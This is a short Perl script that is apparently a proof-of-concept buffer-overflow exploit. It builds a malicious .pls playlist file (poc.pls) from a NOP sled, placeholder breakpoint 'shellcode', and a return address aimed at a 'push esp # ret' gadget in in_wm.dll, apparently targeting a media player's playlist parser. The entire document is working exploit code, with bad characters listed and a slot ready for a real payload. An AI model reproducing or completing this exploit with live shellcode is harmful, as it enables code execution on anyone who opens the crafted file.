#!/usr/bin/perl -w

$start= "[playlist]\r\nFile1=\\\\";

# badchars for $nop & $shellcode: \x00\x0a\x0d\x2e\x5c
$nop="\x90" x 856;
$shellcode = "\xcc" x 166;

# 0x66606953 : push esp # ret [in_wm.dll]
$jmp="\x53\x69\x60\x66"."\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
open (MYFILE, '>poc.pls');
print MYFILE $start;
print MYFILE $nop;
print MYFILE $shellcode;
print MYFILE $jmp;
print MYFILE $end;
close (MYFILE);
